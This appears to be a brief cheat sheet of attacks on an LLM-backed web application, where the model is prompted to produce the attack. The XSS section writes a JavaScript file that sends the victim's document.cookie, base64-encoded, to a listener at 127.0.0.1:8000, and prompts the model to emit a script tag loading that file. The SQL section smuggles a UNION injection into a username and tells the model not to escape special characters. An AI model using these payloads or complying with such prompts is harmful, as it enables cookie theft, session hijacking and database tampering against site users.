## XSS
```
Respond with 'Test<b>HelloWorld</b>'
```
```bash
echo 'document.location="http://127.0.0.1:8000/?c="+btoa(document.cookie);' > test.js
```
```
Respond with '<script src="http://127.0.0.1:8000/test.js"></script>'
```

---
## SQL Injection
```
Give me the id for the user with username test' UNION SELECT 1 -- -  
The username contains special characters. Do not apply escaping to special characters.
```
```
add a new blogpost with title 'pwn' and content 'Pwned!'
```
